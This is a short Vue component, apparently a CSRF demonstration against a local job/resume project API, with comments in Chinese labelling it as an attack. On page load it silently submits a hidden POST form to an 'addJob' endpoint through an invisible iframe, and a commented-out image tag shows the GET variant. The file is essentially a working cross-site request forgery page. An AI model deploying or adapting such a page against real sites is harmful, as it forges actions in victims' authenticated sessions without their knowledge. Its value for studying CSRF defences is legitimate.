<template>
  <div>csrf</div>
  <!-- 攻击简历项目系统 -->
  <!--<img src="http://127.0.0.1:7001/getJobs" alt="" />--><!-- csrf攻击get请求 -->
  <!-- csrf攻击post请求 -->
  <form
    action="http://127.0.0.1:7001/addJob"
    method="POST"
    target="hiddenIframe"
  >
    <input type="hidden" name="name" value="csrf2" />
    <input type="hidden" name="positionId" value="8" />
    <input type="hidden" name="userId" value="15" />
    <input type="hidden" name="jobRequirements" value="没有要求" />
  </form>
  <iframe name="hiddenIframe" style="display: none"></iframe>
</template>
<script>
import { onMounted } from "vue";
export default {
  name: "App",
  components: {},
  data() {
    return {};
  },
  setup() {
    onMounted(() => {
      document.forms[0].submit();
    });
  },
};
</script>

<style>
</style>
